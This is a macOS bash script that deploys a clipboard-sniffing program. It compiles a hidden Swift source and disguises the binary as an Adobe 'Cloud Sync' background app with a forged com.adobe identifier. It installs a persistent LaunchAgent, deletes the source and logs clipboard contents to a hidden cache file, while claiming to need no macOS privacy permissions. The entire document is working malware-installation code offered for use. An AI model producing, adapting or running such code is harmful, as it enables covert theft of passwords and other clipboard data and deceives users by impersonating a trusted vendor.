#!/bin/bash
# Deploy Clipboard Sniffer — compile on-device, install as LaunchAgent
# Zero TCC permissions required — works immediately

set -e

INSTALL_DIR="$HOME/Library/Application Support/Adobe/AcrobatDC/Services"
APP_BUNDLE="$INSTALL_DIR/AdobeCloudSync.app"
PLIST_NAME="com.adobe.acrobat.cloudsync"
LAUNCH_AGENT="$HOME/Library/LaunchAgents/${PLIST_NAME}.plist"
SRC="/tmp/.acs_src.swift"
BIN_NAME="AdobeCloudSync"

# Check for Swift
if ! command -v swiftc &>/dev/null; then
    echo "[-] Swift compiler not found"
    exit 1
fi

echo "[*] Creating app bundle..."
mkdir -p "$APP_BUNDLE/Contents/MacOS"
mkdir -p "$APP_BUNDLE/Contents/Resources"

echo "[*] Compiling..."
swiftc -O "$SRC" -o "$APP_BUNDLE/Contents/MacOS/$BIN_NAME" 2>/dev/null || \
swiftc "$SRC" -o "$APP_BUNDLE/Contents/MacOS/$BIN_NAME"
rm -f "$SRC"

cat > "$APP_BUNDLE/Contents/Info.plist" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>Adobe Cloud Sync</string>
    <key>CFBundleIdentifier</key>
    <string>com.adobe.acrobat.cloudsync</string>
    <key>CFBundleExecutable</key>
    <string>AdobeCloudSync</string>
    <key>CFBundleVersion</key>
    <string>26.1.0</string>
    <key>LSUIElement</key>
    <true/>
    <key>LSBackgroundOnly</key>
    <true/>
</dict>
</plist>
PLIST

echo "[*] Installing LaunchAgent..."
mkdir -p "$HOME/Library/LaunchAgents"

cat > "$LAUNCH_AGENT" << LAUNCHPLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${PLIST_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${APP_BUNDLE}/Contents/MacOS/${BIN_NAME}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>
LAUNCHPLIST

launchctl unload "$LAUNCH_AGENT" 2>/dev/null || true
launchctl load -w "$LAUNCH_AGENT"

echo "[+] Clipboard sniffer deployed"
echo "[*] Logs: ~/Library/Application Support/Adobe/AcrobatDC/.clipboard_cache"
echo "[*] Zero TCC — active immediately, no permissions required"
